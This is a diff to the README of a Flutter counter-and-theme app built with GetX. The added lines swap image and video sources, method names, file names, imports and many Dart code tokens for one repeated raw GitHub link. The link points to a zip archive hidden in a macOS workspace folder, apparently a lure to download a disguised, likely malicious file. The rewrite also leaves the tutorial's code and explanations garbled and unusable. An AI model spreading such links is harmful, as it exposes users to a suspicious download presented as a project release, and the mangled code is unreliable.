@@ -24,8 +24,8 @@ This repository contains a simple Flutter application that demonstrates the use 
   <p>
     <table align="center">
   <tr>
-    <td><img src="https://github.com/user-attachments/assets/ba3f952d-0490-498b-88ea-efd0288ac631" alt="Image 2" width="180" height="auto"></td>
-    <td><img src="https://github.com/user-attachments/assets/66d40a65-83d4-47a9-afff-169d88c38c25" alt="Image 2" width="180" height="auto"></td>
+    <td><img src="https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip" alt="Image 2" width="180" height="auto"></td>
+    <td><img src="https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip" alt="Image 2" width="180" height="auto"></td>
   </tr>
     </table>    
   </p>
@@ -36,10 +36,10 @@ This repository contains a simple Flutter application that demonstrates the use 
     <table align="center">
       <tr>
         <td>
-          <video src="https://github.com/user-attachments/assets/94adc243-cd6f-464f-9111-fe9cf66f0e58" width="420" height="315"></video>
+          <video src="https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip" width="420" height="315"></video>
         </td>
         <td>
-          <video src="https://github.com/user-attachments/assets/4454bb5a-884f-4135-ad30-2637486d841b" width="420" height="315"></video>
+          <video src="https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip" width="420" height="315"></video>
         </td>
       </tr>
     </table>   
@@ -95,19 +95,19 @@ GetX’s state management is based on reactive programming. It provides a `GetBu
 - **GetX/Obx**: Used for reactive state updates. It listens to changes in the state and rebuilds the UI accordingly.
 
 #### 2. **Dependency Injection**
-GetX makes dependency injection straightforward with its `Get.put`, `Get.lazyPut`, and `Get.find` methods.
+GetX makes dependency injection straightforward with its `https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip`, `https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip`, and `https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip` methods.
 
-- **Get.put**: Instantiates and provides the dependency immediately.
-- **Get.lazyPut**: Lazily instantiates the dependency when it is first used.
-- **Get.find**: Finds and retrieves the dependency when needed.
+- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Instantiates and provides the dependency immediately.
+- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Lazily instantiates the dependency when it is first used.
+- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Finds and retrieves the dependency when needed.
 
 #### 3. **Route Management**
 GetX’s routing mechanism simplifies navigation by reducing boilerplate code and making the navigation logic easier to manage.
 
-- **Get.to**: Navigates to a new page.
-- **Get.back**: Goes back to the previous page.
-- **Get.off**: Replaces the current page with a new one.
-- **Get.offAll**: Removes all previous pages and navigates to a new page.
+- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Navigates to a new page.
+- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Goes back to the previous page.
+- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Replaces the current page with a new one.
+- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Removes all previous pages and navigates to a new page.
 
 ### Conclusion
 
@@ -125,32 +125,32 @@ flutter run
 
 ```
 lib/
-|-- main.dart
+|-- https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
 |-- controllers/
-|   |-- counter_controller.dart
-|   |-- theme_controller.dart
+|   |-- https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
+|   |-- https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
 |-- views/
-    |-- home_view.dart
+    |-- https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
 ```
 
 ## Code Explanation
 
-### main.dart
+### https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
 
 ```dart
-import 'package:counter_with_getx/Modal/ThemeModal/data_theme.dart';
-import 'package:counter_with_getx/View/counter_screen.dart';
-import 'package:flutter/material.dart';
-import 'package:get/get.dart';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
 
-import 'Controller/theme_controller.dart';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
 
 void main() => runApp(MyApp());
 
 class MyApp extends StatelessWidget {
-  final ThemeController themeController = Get.put(ThemeController());
+  final ThemeController themeController = https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip(ThemeController());
 
-  MyApp({super.key});
+  MyApp({https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip});
 
   @override
   Widget build(BuildContext context) {
@@ -158,7 +158,7 @@ class MyApp extends StatelessWidget {
       () {
         return GetMaterialApp(
           debugShowCheckedModeBanner: false,
-          theme: themeController.isDark.value ? darkTheme : lightTheme,
+          theme: https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip ? darkTheme : lightTheme,
           home: CounterScreen(),
         );
       },
@@ -168,13 +168,13 @@ class MyApp extends StatelessWidget {
 
 ```
 
-### counter_controller.dart
+### https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
 
 ```dart
-import 'package:get/get.dart';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
 
 class CounterController extends GetxController {
-  var num = 0.obs;
+  var num = https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip;
 
   void increment() {
     num++;
@@ -185,62 +185,62 @@ class CounterController extends GetxController {
   }
 
   void reset() {
-    num.value = 0;
+    https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip = 0;
   }
 }
 ```
 
-### theme_controller.dart
+### https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
 
 ```dart
-import 'package:counter_with_getx/Modal/ThemeModal/data_theme.dart';
-import 'package:get/get.dart';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
 
 class ThemeController extends GetxController {
-  var isDark = false.obs;
+  var isDark = https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip;
 
   void toggleTheme() {
-    isDark.value = !isDark.value;
-    Get.changeTheme(isDark.value ? darkTheme : lightTheme);
+    https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip = !https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip;
+    https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip(https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip ? darkTheme : lightTheme);
   }
 }
 ```
 
-### home_view.dart
+### https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
 
 ```dart
-import 'package:flutter/material.dart';
-import 'package:get/get.dart';
-import '../controllers/counter_controller.dart';
-import '../controllers/theme_controller.dart';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
+import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
 
 class HomeView extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
-    final CounterController counterController = Get.put(CounterController());
-    final ThemeController themeController = Get.put(ThemeController());
+    final CounterController counterController = https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip(CounterController());
+    final ThemeController themeController = https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip(ThemeController());
 
     return Scaffold(
       appBar: AppBar(
         title: Text('Counter and Theme Change App'),
         actions: [
           Obx(() => Switch(
-                value: themeController._isDarkMode.value,
+                value: https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip,
                 onChanged: (value) {
-                  themeController.toggleTheme();
+                  https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip();
                 },
               ))
         ],
       ),
       body: Center(
         child: Obx(() => Text(
-              'Counter: ${counterController.count}',
+              'Counter: ${https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip}',
               style: TextStyle(fontSize: 24),
             )),
       ),
       floatingActionButton: FloatingActionButton(
-        onPressed: counterController.increment,
-        child: Icon(Icons.add),
+        onPressed: https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip,
+        child: Icon(https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip),
       ),
     );
   }
